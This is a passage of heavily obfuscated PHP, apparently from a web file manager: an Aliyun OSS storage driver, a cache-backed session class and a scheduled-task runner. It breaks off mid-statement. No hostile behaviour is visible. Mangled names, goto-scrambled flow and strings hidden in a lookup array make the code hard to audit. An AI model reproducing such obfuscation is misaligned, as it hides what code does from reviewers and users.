OSS\OssClient::OSS_HEADERS => array($c¢ñ—º÷–[1255] => @md5_file($b˜‰èô¾‚é)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($fã—†ËÌ²Ê))); $CÄì»ˆ¯” = $this->trafficLimit($c¢ñ—º÷–[1266], $CÄì»ˆ¯”); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($FÚø¡Õˆ®‹), $b˜‰èô¾‚é, $CÄì»ˆ¯”); } catch (OSS\Core\OssException $d£™õ´Úš”) { return !1; } return $this->getPathOuter($fã—†ËÌ²Ê); } public function getHost() { $E›Ø±¼Ê‡¼ =& $_SERVER[µ…]; $AÁ®ÍË†ó = explode($E›Ø±¼Ê‡¼[176], parent::getHost()); return $AÁ®ÍË†ó[0] . $E›Ø±¼Ê‡¼[176] . $this->bucket . $E›Ø±¼Ê‡¼[94] . $AÁ®ÍË†ó[1]; } public function uploadFormData($cã™¥¯ƒÈŠ, $bˆÒòæ®Ì = 3600) { goto fÆ™‹ºÌ–¶; bò‡àØß£µ: $DÍ¦ë‡¾è× = date($b¨Ş“Ù˜µ[1269], time() + $Cø¡ÄŸÊá); $CŞŸ¶‡ù— = new DateTime($DÍ¦ë‡¾è×); $dÛØ³âæ…Ş = $CŞŸ¶‡ù—->format(DateTime::ISO8601); goto BµŠ£¨ŸÀ®; fÆ™‹ºÌ–¶: $b¨Ş“Ù˜µ =& $_SERVER[µ…]; if (!($cõ¸àÀ¦Ôê = $this->getHost())) { return !1; } $Cø¡ÄŸÊá = $bˆÒòæ®Ì; goto bò‡àØß£µ; BµŠ£¨ŸÀ®: $Dä™ªİ†Õº = strpos($dÛØ³âæ…Ş, $b¨Ş“Ù˜µ[292]); $dÛØ³âæ…Ş = substr($dÛØ³âæ…Ş, 0, $Dä™ªİ†Õº) . $b¨Ş“Ù˜µ[1270]; $d÷ƒ…Êíœ = 1048576000 * 5; goto d°ö­•…­; d°ö­•…­: $a­ô‰™˜œŒ = $this->pathFather($cã™¥¯ƒÈŠ); $bŸ– ñ„ = array($b¨Ş“Ù˜µ[1166] => $dÛØ³âæ…Ş, $b¨Ş“Ù˜µ[1167] => array(array($b¨Ş“Ù˜µ[1271], 0, $d÷ƒ…Êíœ), array($b¨Ş“Ù˜µ[1170], $b¨Ş“Ù˜µ[1171], $a­ô‰™˜œŒ))); $c“èğĞĞÀç = base64_encode(json_encode($bŸ– ñ„)); goto FÒØì‚ßÒ§; FÒØì‚ßÒ§: $f«ÚÇ®‘œ¸ = base64_encode(hash_hmac($b¨Ş“Ù˜µ[228], $c“èğĞĞÀç, $this->secret, !0)); $b…íÜ±‡íî = array($b¨Ş“Ù˜µ[1176] => $c“èğĞĞÀç, $b¨Ş“Ù˜µ[1272] => $this->accessKey, $b¨Ş“Ù˜µ[1172] => $b¨Ş“Ù˜µ[1164], $b¨Ş“Ù˜µ[1273] => $f«ÚÇ®‘œ¸, $b¨Ş“Ù˜µ[174] => $cõ¸àÀ¦Ôê); $b…íÜ±‡íî = $this->trafficLimit($b¨Ş“Ù˜µ[1266], $b…íÜ±‡íî); goto f¶òÓÏÖÍ¢; f¶òÓÏÖÍ¢: return $b…íÜ±‡íî; goto CÂÄÈó¼Âí; CÂÄÈó¼Âí: } public function multiUploadFormData($fŠ‡³ù¶, $e±ó•‚´È§ = 3600) { $Eä­åÉê›« =& $_SERVER[µ…]; if (!($Dª´‡ô§ = $this->getHost())) { return !1; } $f‡®ºÚçº = $this->trafficLimit($Eä­åÉê›«[1266]); $bì²Ù®ò›Ö = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($fŠ‡³ù¶), $f‡®ºÚçº); return array($Eä­åÉê›«[219] => $bì²Ù®ò›Ö, $Eä­åÉê›«[174] => $Dª´‡ô§ . $Eä­åÉê›«[8] . $this->pathEncode($fŠ‡³ù¶), $Eä­åÉê›«[220] => gmdate($Eä­åÉê›«[1274]), $Eä­åÉê›«[92] => $fŠ‡³ù¶); } public function multiUploadAuthData($Dóô·˜œĞ–, $fÅ—†Û´ö– = array()) { goto eø’àÈŒÉ; eæ‘öÛãä: $CºéÚ·ÖÏ‰ = array($eÂÏ“¦óğ[222], $eÂÏ“¦óğ[33], $eÂÏ“¦óğ[118], $E¹†Õå†øº, "\170\x2d\157\x73\163\55\144\141\x74\x65\x3a{$E¹†Õå†øº}", $eÂÏ“¦óğ[8] . $this->bucket . $eÂÏ“¦óğ[8] . $a—šœ£Æ . $c£¼éÔÂ»Ö); if (strpos($c£¼éÔÂ»Ö, $eÂÏ“¦óğ[223]) === 0) { $CºéÚ·ÖÏ‰[0] = $eÂÏ“¦óğ[224]; if ($D´”ª©ØŸ¿ = $this->trafficLimit($eÂÏ“¦óğ[1266])) { $a—šœ£Æ = $eÂÏ“¦óğ[1275]; array_splice($CºéÚ·ÖÏ‰, 5, 0, $a—šœ£Æ . $eÂÏ“¦óğ[4] . $D´”ª©ØŸ¿[$a—šœ£Æ]); } } if (isset($fÅ—†Û´ö–[$eÂÏ“¦óğ[225]]) && $fÅ—†Û´ö–[$eÂÏ“¦óğ[225]] == $eÂÏ“¦óğ[226]) { $CºéÚ·ÖÏ‰[0] = $eÂÏ“¦óğ[226]; } goto ašÑ¡¹„ˆÅ; f“‰÷—™Öå: $FÑÉ°óš™ó = $eÂÏ“¦óğ[1239] . $this->accessKey . $eÂÏ“¦óğ[4] . $cÖøæõÌÉ; if (strpos($c£¼éÔÂ»Ö, $eÂÏ“¦óğ[223]) === 0) { $FÑÉ°óš™ó = array($eÂÏ“¦óğ[230] => $FÑÉ°óš™ó, $eÂÏ“¦óğ[220] => $E¹†Õå†øº); if ($D´”ª©ØŸ¿) { $FÑÉ°óš™ó = array_merge($FÑÉ°óš™ó, $D´”ª©ØŸ¿); } } return $FÑÉ°óš™ó; goto Eñ•›çØ™Á; eø’àÈŒÉ: $eÂÏ“¦óğ =& $_SERVER[µ…]; $E¹†Õå†øº = isset($fÅ—†Û´ö–[$eÂÏ“¦óğ[220]]) ? $fÅ—†Û´ö–[$eÂÏ“¦óğ[220]] : gmdate($eÂÏ“¦óğ[1274]); $c£¼éÔÂ»Ö = isset($fÅ—†Û´ö–[$eÂÏ“¦óğ[167]]) ? $fÅ—†Û´ö–[$eÂÏ“¦óğ[167]] : $eÂÏ“¦óğ[33]; goto C²¶ë†Ğ; ašÑ¡¹„ˆÅ: if (!empty($fÅ—†Û´ö–[$eÂÏ“¦óğ[1276]])) { $E¹·Âç³Ì = array_merge(array($CºéÚ·ÖÏ‰[4]), $fÅ—†Û´ö–[$eÂÏ“¦óğ[1276]]); sort($E¹·Âç³Ì); $CºéÚ·ÖÏ‰[4] = implode($eÂÏ“¦óğ[227], $E¹·Âç³Ì); } $aŠ¯´Üœ»» = implode($eÂÏ“¦óğ[227], $CºéÚ·ÖÏ‰); $cÖøæõÌÉ = base64_encode(hash_hmac($eÂÏ“¦óğ[228], $aŠ¯´Üœ»», $this->secret, !0)); goto f“‰÷—™Öå; C²¶ë†Ğ: $a—šœ£Æ = $Dóô·˜œĞ–; if (isset($fÅ—†Û´ö–[$eÂÏ“¦óğ[92]])) { $a—šœ£Æ = $fÅ—†Û´ö–[$eÂÏ“¦óğ[92]]; unset($fÅ—†Û´ö–[$eÂÏ“¦óğ[92]]); } if (isset($fÅ—†Û´ö–[$eÂÏ“¦óğ[221]])) { $fÅ—†Û´ö–[$eÂÏ“¦óğ[220]] = $E¹†Õå†øº; return $this->listUploadParts($a—šœ£Æ, $fÅ—†Û´ö–); } goto eæ‘öÛãä; Eñ•›çØ™Á: } public function listUploadParts($c¡‡«¹µÏ‡, $CäÎŒŸÃ†°) { goto F¬†îÌ«í; CßóĞË¶ÅÙ: return array($c¤é›óã¸[230] => $DÄ“Ç°Æ¥Ø, $c¤é›óã¸[220] => $CäÎŒŸÃ†°[$c¤é›óã¸[220]], $c¤é›óã¸[232] => $dè¥È‚È); goto FÑ–äÙâŒ; F¬†îÌ«í: $c¤é›óã¸ =& $_SERVER[µ…]; $A×‡±„Å¹á = parse_url_query($CäÎŒŸÃ†°[$c¤é›óã¸[167]]); $a¨Ì¦×ºÅ = $this->client->listParts($this->bucket, $this->pathEncode($c¡‡«¹µÏ‡), $A×‡±„Å¹á[$c¤é›óã¸[219]]); goto f¦×êøÚ¸³; c‡µ³—‰°: unset($CäÎŒŸÃ†°[$c¤é›óã¸[221]], $CäÎŒŸÃ†°[$c¤é›óã¸[225]]); $DÄ“Ç°Æ¥Ø = $this->multiUploadAuthData($c¡‡«¹µÏ‡, $CäÎŒŸÃ†°); if (empty($DÄ“Ç°Æ¥Ø)) { return !1; } goto CßóĞË¶ÅÙ; f¦×êøÚ¸³: $F«ä‡œ•Åë = $a¨Ì¦×ºÅ->getListPart(); $dè¥È‚È = array(); foreach ($F«ä‡œ•Åë as $Aô†‰¤¼“) { $dè¥È‚È[] = array($c¤é›óã¸[1259] => $Aô†‰¤¼“->getPartNumber(), $c¤é›óã¸[1260] => trim($Aô†‰¤¼“->getETag(), $c¤é›óã¸[115])); } goto c‡µ³—‰°; FÑ–äÙâŒ: } public function download($Eİ«’Ê±ÚÙ, $Añ«éÀ“ÇÅ) { if ($this->isFolder($Eİ«’Ê±ÚÙ)) { return !1; } try { $eœ¡ÅÑø = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Añ«éÀ“ÇÅ); $eœ¡ÅÑø = $this->trafficLimit($_SERVER[µ…][108], $eœ¡ÅÑø); $this->client->getObject($this->bucket, $this->pathEncode($Eİ«’Ê±ÚÙ), $eœ¡ÅÑø); } catch (OSS\Core\OssException $A“ĞºÄ³â”) { return !1; } return $Añ«éÀ“ÇÅ; } public function fileSubstr($EŸñµöÈ±´, $D¶òŒóå¸ = 0, $cßå¾Š¤› = false) { if ($D¶òŒóå¸ === -1) { $B†«¾µÄˆ = array(); } else { if ($cßå¾Š¤› === !1) { $C›Š„‡á—Ô = $this->size($EŸñµöÈ±´); } else { $C›Š„‡á—Ô = $D¶òŒóå¸ + $cßå¾Š¤› - 1; } $B†«¾µÄˆ = array(OSS\OssClient::OSS_RANGE => "{$D¶òŒóå¸}\55{$C›Š„‡á—Ô}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($EŸñµöÈ±´), $B†«¾µÄˆ); } catch (OSS\Core\OssException $bĞô’Ä‹¥) { think_exception($bĞô’Ä‹¥->getMessage()); return !1; } } private function trafficLimit($aèÀøí’›™, $F“¬µ„îŒğ = array()) { goto CÃÊ†¯¹Œ; CÃÊ†¯¹Œ: $f§ÎØ×‹™¼ =& $_SERVER[µ…]; if ($aèÀøí’›™ == $f§ÎØ×‹™¼[1266] && $this->isUploadServer() || $aèÀøí’›™ == $f§ÎØ×‹™¼[108] && $this->isFileOutServer()) { return $F“¬µ„îŒğ; } $dˆ¯•î³Æ = floatval($GLOBALS[$f§ÎØ×‹™¼[6]][$f§ÎØ×‹™¼[87]][$f§ÎØ×‹™¼[106]][$aèÀøí’›™]) * 1024 * 1024 * 8; goto FÔù…Ç÷Ÿ‹; FÔù…Ç÷Ÿ‹: if (!$dˆ¯•î³Æ) { return $F“¬µ„îŒğ; } $dˆ¯•î³Æ = $dˆ¯•î³Æ < 819200 ? 819200 : ($dˆ¯•î³Æ > 838860800 ? 838860800 : $dˆ¯•î³Æ); $F“¬µ„îŒğ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($dˆ¯•î³Æ); goto aÀÓçœ¨Æ; aÀÓçœ¨Æ: return $F“¬µ„îŒğ; goto f©¢¶ø½ëÙ; f©¢¶ø½ëÙ: } public function link($cğëÛŒ©®ğ, $a™³œÓÍËì = array()) { $a¡ÈÂ™İÃ÷ =& $_SERVER[µ…]; if (!$this->exist($cğëÛŒ©®ğ) || $this->isFolder($cğëÛŒ©®ğ)) { return !1; } try { $a™³œÓÍËì = $this->trafficLimit($a¡ÈÂ™İÃ÷[108], $a™³œÓÍËì); $cÓ×™ ”£Ï = $this->client->signUrl($this->bucket, $this->pathEncode($cğëÛŒ©®ğ), 3600 * 12, $a¡ÈÂ™İÃ÷[226], $a™³œÓÍËì); return $this->getCdnLink($cÓ×™ ”£Ï); } catch (OSS\Core\OssException $C®ºÖƒŠ—±) { return !1; } } public function fileOut($b°”…ÙŞ§, $A‡ÄŒ¹ˆ²˜ = false, $E›Ã²‹ÛöŒ = false, $EÍÜÕµ«ŒÂ = '') { goto fÕ–ïˆÓƒ; Fê·¾éÇ¸±: $A‡ÄŒ¹ˆ²˜ = $A‡ÄŒ¹ˆ²˜ ? $F¢ù­é¯ÎÔ[212] : $F¢ù­é¯ÎÔ[213]; $eë›‹÷÷‹ = array(OSS\OssClient::OSS_SUB_RESOURCE => $F¢ù­é¯ÎÔ[1277] . rawurlencode("{$A‡ÄŒ¹ˆ²˜}\x3b\146\151\154\145\156\x61\155\x65\75{$E›Ã²‹ÛöŒ}")); $eë›‹÷÷‹[OSS\OssClient::OSS_SUB_RESOURCE] .= $F¢ù­é¯ÎÔ[1278] . rawurlencode($A•„ìïÎÛß); goto cˆ´èØ„; E½ñ§ÓŒöö: $E›Ã²‹ÛöŒ = rawurlencode($E›Ã²‹ÛöŒ); $A•„ìïÎÛß = get_file_mime(get_path_ext($E›Ã²‹ÛöŒ)); if ($A•„ìïÎÛß == $F¢ù­é¯ÎÔ[211]) { return parent::fileOut($b°”…ÙŞ§, $A‡ÄŒ¹ˆ²˜, $E›Ã²‹ÛöŒ, $EÍÜÕµ«ŒÂ); } goto Fê·¾éÇ¸±; fÕ–ïˆÓƒ: $F¢ù­é¯ÎÔ =& $_SERVER[µ…]; if ($this->isFileOutServer()) { return $this->fileOutServer($b°”…ÙŞ§, $A‡ÄŒ¹ˆ²˜, $E›Ã²‹ÛöŒ, $EÍÜÕµ«ŒÂ); } if (!$E›Ã²‹ÛöŒ) { $E›Ã²‹ÛöŒ = $this->pathThis($b°”…ÙŞ§); } goto E½ñ§ÓŒöö; cˆ´èØ„: $eùËàŠäö = $this->link($b°”…ÙŞ§, $eë›‹÷÷‹); $this->fileOutLink($eùËàŠäö); goto AÔÑ³‘ƒĞõ; AÔÑ³‘ƒĞõ: } public function fileOutServer($C”ö¨Ü¤„, $AÇÁšøïĞŸ = false, $e‚¸Á¼î– = false, $E‡©¬‘Š×ß = '') { parent::fileOut($C”ö¨Ü¤„, $AÇÁšøïĞŸ, $e‚¸Á¼î–, $E‡©¬‘Š×ß); } public function fileOutImage($b‡–¼‘ˆº‘, $b¢®ÊÙƒÅİ = 250) { $F„™®”Ö½ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[µ…][1279] . $b¢®ÊÙƒÅİ); $FòÚÑµÄ½ = $this->link($b‡–¼‘ˆº‘, $F„™®”Ö½); $this->fileOutLink($FòÚÑµÄ½); } public function fileOutImageServer($Aƒ¥ÜÌåù, $c¾Âö•ÜŠÉ = 250) { parent::fileOutImage($Aƒ¥ÜÌåù, $c¾Âö•ÜŠÉ); } public function fileOutLink($fŒĞµ¦ Ïİ) { $DÂ£—ˆŞìÆ =& $_SERVER[µ…]; if (!$this->isCdnHost() && substr($fŒĞµ¦ Ïİ, 0, 7) == $DÂ£—ˆŞìÆ[1179]) { $fŒĞµ¦ Ïİ = $DÂ£—ˆŞìÆ[1180] . substr($fŒĞµ¦ Ïİ, 7); } header($DÂ£—ˆŞìÆ[158] . $fŒĞµ¦ Ïİ); die; } public function hashMd5($D‘ó­×ëò†, $f¶éÜÉ¾ã = '') { $f»·®‚‡å =& $_SERVER[µ…]; $aö¼ÕÒŠæ¢ = $this->_objectMeta($D‘ó­×ëò†); if (!$aö¼ÕÒŠæ¢) { return $f»·®‚‡å[33]; } if (!isset($aö¼ÕÒŠæ¢[$f»·®‚‡å[1255]]) && !empty($f¶éÜÉ¾ã)) { $AÑ´‚ßÓŸÙ = $this->updateObjMeta($D‘ó­×ëò†, array($f»·®‚‡å[1255] => $f¶éÜÉ¾ã)); $aö¼ÕÒŠæ¢[$f»·®‚‡å[1255]] = $AÑ´‚ßÓŸÙ ? $f¶éÜÉ¾ã : $f»·®‚‡å[33]; } return isset($aö¼ÕÒŠæ¢[$f»·®‚‡å[1255]]) ? strtolower($aö¼ÕÒŠæ¢[$f»·®‚‡å[1255]]) : $f»·®‚‡å[33]; } public function size($C¢ù ¸í¡Û) { $E…È‡­Ÿ¹Œ = $this->objectMeta($C¢ù ¸í¡Û); return $E…È‡­Ÿ¹Œ ? $E…È‡­Ÿ¹Œ[$_SERVER[µ…][77]] : 0; } public function info($B±ÃŒœ÷©·) { if ($this->isFolder($B±ÃŒœ÷©·)) { return $this->folderInfo($B±ÃŒœ÷©·); } else { if ($this->isFile($B±ÃŒœ÷©·)) { return $this->fileInfo($B±ÃŒœ÷©·); } } return !1; } public function exist($C¿çÉùË¬ø) { return $this->isFile($C¿çÉùË¬ø) || $this->isFolder($C¿çÉùË¬ø); } public function isFile($aòå‹ó™Â¤) { return !$this->isFolder($aòå‹ó™Â¤) && $this->objectMeta($aòå‹ó™Â¤); } public function isFolder($b•ÈàŞÆêÜ) { return $this->cacheMethod($_SERVER[µ…][197], $b•ÈàŞÆêÜ); } protected function objectMeta($BÓß°²¶°Ÿ) { return $this->cacheMethod($_SERVER[µ…][198], $BÓß°²¶°Ÿ); } protected function _objectMeta($A¼åĞÎ¯İÊ) { $díç®æÙù„ =& $_SERVER[µ…]; try { $Eóæèªß¹¯ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($A¼åĞÎ¯İÊ)); } catch (OSS\Core\OssException $Eõ†æäª¦) { $Eóæèªß¹¯ = !1; } if ($Eóæèªß¹¯) { $Eóæèªß¹¯[$díç®æÙù„[77]] = intval($Eóæèªß¹¯[$díç®æÙù„[1253]]); } return $Eóæèªß¹¯; } protected function _isFolder($b°Û‡íğÜ‡) { $DÊ÷È‹¥Å¶ =& $_SERVER[µ…]; if ($b°Û‡íğÜ‡ == $DÊ÷È‹¥Å¶[33] || $b°Û‡íğÜ‡ == $DÊ÷È‹¥Å¶[8]) { return !0; } $fôŒˆ¨Ï¼Å = array($DÊ÷È‹¥Å¶[1249] => $DÊ÷È‹¥Å¶[8], $DÊ÷È‹¥Å¶[1250] => rtrim($b°Û‡íğÜ‡, $DÊ÷È‹¥Å¶[8]) . $DÊ÷È‹¥Å¶[8], $DÊ÷È‹¥Å¶[1251] => 1, $DÊ÷È‹¥Å¶[1252] => $DÊ÷È‹¥Å¶[33]); $aÉ©›¥•À‡ = $this->client->listObjects($this->bucket, $fôŒˆ¨Ï¼Å); if ($aÉ©›¥•À‡->getObjectList() || $aÉ©›¥•À‡->getPrefixList()) { return !0; } return !1; } } goto cÔÁå®Ã–ä; f–ïŒ‚ñ§¿: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto e—£¼ç; E‰ˆ¯†ƒÈ: if (self::$sessionSign) { } else { if (Cookie::get($bñ‘˜ÕÚôñ)) { self::$sessionSign = Cookie::get($bñ‘˜ÕÚôñ); } else { self::$sessionSign = guid(); } } Cookie::setSafe($bñ‘˜ÕÚôñ, self::$sessionSign, self::$sessionTime); $eŞíååÓ‰– = $AŒÑù³Ê³ï[$c°ª“Ùµ‘˜[1467]]; goto e²’º£‘…; dÑ‚‰…˜±£: $AŒÑù³Ê³ï = $GLOBALS[$c°ª“Ùµ‘˜[6]][$c°ª“Ùµ‘˜[345]]; self::$sessionTime = $AŒÑù³Ê³ï[$c°ª“Ùµ‘˜[1465]]; $bñ‘˜ÕÚôñ = isset($GLOBALS[$c°ª“Ùµ‘˜[1466]]) ? $GLOBALS[$c°ª“Ùµ‘˜[1466]] : SESSION_ID; goto E‰ˆ¯†ƒÈ; a‰Ò¡İçñ: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $FÉùŸ ²­³ = new self(); return $FÉùŸ ²­³; goto C½—åÇÃ“±; e²’º£‘…: $AóÏ”ª«ˆÍ = $AŒÑù³Ê³ï[$eŞíååÓ‰–]; $cÉ¢ç í™Š = $AŒÑù³Ê³ï[$c°ª“Ùµ‘˜[772]]; switch ($eŞíååÓ‰–) { case $c°ª“Ùµ‘˜[17]: self::$handle = Model($c°ª“Ùµ‘˜[773]); break; case $c°ª“Ùµ‘˜[774]: self::$handle = new CacheRedis($AóÏ”ª«ˆÍ, $cÉ¢ç í™Š); break; case $c°ª“Ùµ‘˜[775]: self::$handle = new CacheMemcached($AóÏ”ª«ˆÍ, $cÉ¢ç í™Š); break; case $c°ª“Ùµ‘˜[191]: $AóÏ”ª«ˆÍ[$c°ª“Ùµ‘˜[75]] = $AóÏ”ª«ˆÍ[$c°ª“Ùµ‘˜[75]] . $c°ª“Ùµ‘˜[1468]; self::$handle = new CacheFile($AóÏ”ª«ˆÍ, $cÉ¢ç í™Š); default: break; } goto a‰Ò¡İçñ; e—£¼ç: $c°ª“Ùµ‘˜ =& $_SERVER[µ…]; static $FÉùŸ ²­³ = false; if ($FÉùŸ ²­³) { return $FÉùŸ ²­³; } goto dÑ‚‰…˜±£; C½—åÇÃ“±: } public static function sign($fŞ½¡˜ŠÒù = false) { $fŞ½¡˜ŠÒù && (self::$sessionSign = $fŞ½¡˜ŠÒù); self::init(); return self::$sessionSign; } public static function set($F®Ûœìœ–±, $DŒ‡’‹«ƒƒ = false) { self::init(); if (is_array($F®Ûœìœ–±)) { foreach ($F®Ûœìœ–± as $a½‚¡ŠŞÔƒ => $B·ÎÇÙ­Ğ‰) { array_set_value(self::$data, $a½‚¡ŠŞÔƒ, $B·ÎÇÙ­Ğ‰); } } else { array_set_value(self::$data, $F®Ûœìœ–±, $DŒ‡’‹«ƒƒ); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($eàºİÇî×† = false) { self::init(); if (!$eàºİÇî×†) { return self::$data; } return array_get_value(self::$data, $eàºİÇî×†); } public static function remove($DŸ¸ÍóßØß) { self::init(); unset(self::$data[$DŸ¸ÍóßØß]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[µ…][777])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto fŠ¨‹³¶ÆÖ; fŠ¨‹³¶ÆÖ: $D½ôïÚ‰ë“ =& $_SERVER[µ…]; if (self::valueGet($D½ôïÚ‰ë“[704]) != $D½ôïÚ‰ë“[86]) { return; } if (self::valueGet($D½ôïÚ‰ë“[1469]) == $D½ôïÚ‰ë“[86]) { $d¶¯¹éÅœ = self::valueGet($D½ôïÚ‰ë“[1470]); if (time() - $d¶¯¹éÅœ > 3600 * 2) { self::restart(); } return; } goto CšÔ‚éˆ©İ; B˜Âø©ÜŸ: while (!0) { self::cacheClear(); if (self::valueGet($D½ôïÚ‰ë“[704]) != $D½ôïÚ‰ë“[86]) { self::valueSet($D½ôïÚ‰ë“[1469], $D½ôïÚ‰ë“[491]); self::log($D½ôïÚ‰ë“[1473]); die; } self::valueSet($D½ôïÚ‰ë“[1469], $D½ôïÚ‰ë“[86]); self::valueSet($D½ôïÚ‰ë“[1470], time()); self::taskRunAll(); sleep(self::valueGet($D½ôïÚ‰ë“[1474])); } goto AÜÕËÙÏ»ß; CšÔ‚éˆ©İ: http_close(); self::valueSet($D½ôïÚ‰ë“[1469], $D½ôïÚ‰ë“[86]); Hook::bind($D½ôïÚ‰ë“[1471], $D½ôïÚ‰ë“[1472]); goto B˜Âø©ÜŸ; AÜÕËÙÏ»ß: } public static function restart() { $A¸ƒ´ˆ´± =& $_SERVER[µ…]; http_close(); self::valueSet($A¸ƒ´ˆ´±[704], $A¸ƒ´ˆ´±[491]); sleep(self::valueGet($A¸ƒ´ˆ´±[1474]) + 5); self::valueSet($A¸ƒ´ˆ´±[1469], $A¸ƒ´ˆ´±[491]); self::valueSet($A¸ƒ´ˆ´±[704], $A¸ƒ´ˆ´±[86]); } public static function shutdownEvent() { $c¼£İ­¡£ =& $_SERVER[µ…]; self::valueSet($c¼£İ­¡£[1469], $c¼£İ­¡£[491]); self::log($c¼£İ­¡£[1475]); } public static function config($c’µ®“Õõ±, $cÒ—×«ÆÛÌ) { $dŞêïõÇİ =& $_SERVER[µ…]; $BÊª­ĞŒßË = 10; $cÒ—×«ÆÛÌ = intval($cÒ—×«ÆÛÌ) <= $BÊª­ĞŒßË ? $BÊª­ĞŒßË : intval($cÒ—×«ÆÛÌ); self::valueSet($dŞêïõÇİ[704], $c’µ®“Õõ±); self::valueSet($dŞêïõÇİ[1474], $cÒ—×«ÆÛÌ); } private static function taskRunAll() { goto eñ†ÔˆÁêš; Aìåç›™ô: $D×‘÷Óâéô = count($dùª„ŠÄÑ„); for ($Cë¥ÖŠÌÔ = 0; $Cë¥ÖŠÌÔ < $D×‘÷Óâéô; $Cë¥ÖŠÌÔ++) { $bŸòÇŒêº… = $dùª„ŠÄÑ„[$Cë¥ÖŠÌÔ]; if (!$bŸòÇŒêº…[$B­¶¬“…Éİ[388]] || $bŸòÇŒêº…[$B­¶¬“…Éİ[1477]] != $B­¶¬“…Éİ[86]) { continue; } if (!self::taskTimeCheck($bŸòÇŒêº…)) { continue; } self::taskRun($bŸòÇŒêº…); } Hook::trigger($B­¶¬“…Éİ[1478]); goto A¾÷¾¦›¦é; eñ†ÔˆÁêš: $B­¶¬“…Éİ =& $_SERVER[µ…]; $cñè‹²ôå¦ = timeFloat(); $dùª„ŠÄÑ„ = Model($B­¶¬“…Éİ[1476])->listData(); goto Aìåç›™ô; A¾÷¾¦›¦é: self::taskQueueRun($cñè‹²ôå¦); self::closeDatabase(); goto B»İ¯¦Â¾Ÿ; B»İ¯¦Â¾Ÿ: } private static function taskQueueRun($C™šˆÛÂğ) { $Bƒ½„ïÌòÈ = 10; while (!0) { $c¥¿µŸ˜Ùˆ = TaskQueue::run(); if ($c¥¿µŸ˜Ùˆ === !1) { break; } if (timeFloat() - $C™šˆÛÂğ >= $Bƒ½„ïÌòÈ) { break; } } } private static function taskTimeCheck($F¤øŞŒ²¶) { goto a©ÙóİÕí; C£Œ²¶Î©©: switch ($EÓœ˜×˜»Ò[$d÷¤»£µ·µ[29]]) { case $d÷¤»£µ·µ[1485]: if (time() - $aåİ§ËŸ´ß < 3600 * 24 * 30) { return !1; } if ($EÓœ˜×˜»Ò[$d÷¤»£µ·µ[1485]] == date($d÷¤»£µ·µ[1486]) && $Cä’Ç‹í¢) { return !0; } break; case $d÷¤»£µ·µ[1487]: if (time() - $aåİ§ËŸ´ß < 3600 * 24 * 7) { return !1; } $BŠ‰Ş±ö  = date($d÷¤»£µ·µ[1488]) == 0 ? 7 : date($d÷¤»£µ·µ[1488]); if ($EÓœ˜×˜»Ò[$d÷¤»£µ·µ[1487]] == $BŠ‰Ş±ö  && $Cä’Ç‹í¢) { return !0; } break; case $d÷¤»£µ·µ[1480]: if (time() - $aåİ§ËŸ´ß < 3600 * 24) { return !1; } if ($Cä’Ç‹í¢) { return !0; } break; case $d÷¤»£µ·µ[1489]: if (time() - $aåİ§ËŸ´ß >= floatval($EÓœ˜×˜»Ò[$d÷¤»£µ·µ[1489]]) * 60) { return !0; } break; default: break; } return !1; goto D¸öì¢ß”; aä¦çê´Š½: $D‰®Ÿëİé = strtotime($d÷¤»£µ·µ[1479] . $EÓœ˜×˜»Ò[$d÷¤»£µ·µ[1480]] . $d÷¤»£µ·µ[1481]) - strtotime($d÷¤»£µ·µ[1482]); $F£…ß‰ˆ´ = time() - strtotime(date($d÷¤»£µ·µ[1483]) . $d÷¤»£µ·µ[1484]); $Cä’Ç‹í¢ = $F£…ß‰ˆ´ >= $D‰®Ÿëİé && $F£…ß‰ˆ´ <= $D‰®Ÿëİé + 3600; goto C£Œ²¶Î©©; a©ÙóİÕí: $d÷¤»£µ·µ =& $_SERVER[µ…]; $EÓœ˜×˜»Ò = json_decode($F¤øŞŒ²¶[$d÷¤»£µ·µ[195]], !0); $aåİ§ËŸ´ß = intval($F¤øŞŒ²¶[$d÷¤»£µ·µ[1470]]); goto aä¦çê´Š½; D¸öì¢ß”: } private static function closeDatabase() { goto E‚×­½£; EçæŸÏ‡„¡: $eî×´ë‘İñ = Model($eò‹¤ƒ‘ò‘[497])->db($eò‹¤ƒ‘ò‘[33]); if ($eî×´ë‘İñ) { $eî×´ë‘İñ->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($eò‹¤ƒ‘ò‘[1490], $eò‹¤ƒ‘ò‘[1491]); die; } goto b‰ÙùâŒ«¦; f»ìƒ¿°Ó: if (!$bí”²­ÁµÍ) { $bí”²­ÁµÍ = time(); } if (time() - $bí”²­ÁµÍ < $d‚ˆ‡¸ÃÂ•) { return; } $bí”²­ÁµÍ = time(); goto EçæŸÏ‡„¡; E‚×­½£: $eò‹¤ƒ‘ò‘ =& $_SERVER[µ…]; static $bí”²­ÁµÍ = 0; $d‚ˆ‡¸ÃÂ• = 1800; goto f»ìƒ¿°Ó; b‰ÙùâŒ«¦: } public static function taskRun($a“·Šç÷ƒ) { goto C®Ö»İ¢; A«ğô·›é: $f’¥©±Ô = timeFloat(); $B¾ƒù™ºØ• = $E¦Ã¤å•Î¼[33]; switch ($a“·Šç÷ƒ[$E¦Ã¤å•Î¼[29]]) { case $E¦Ã¤å•Î¼[303]: $fßŒ©Ô‚ = url_request($a“·Šç÷ƒ[$E¦Ã¤å•Î¼[1495]], $E¦Ã¤å•Î¼[226], !1, !1, !1, 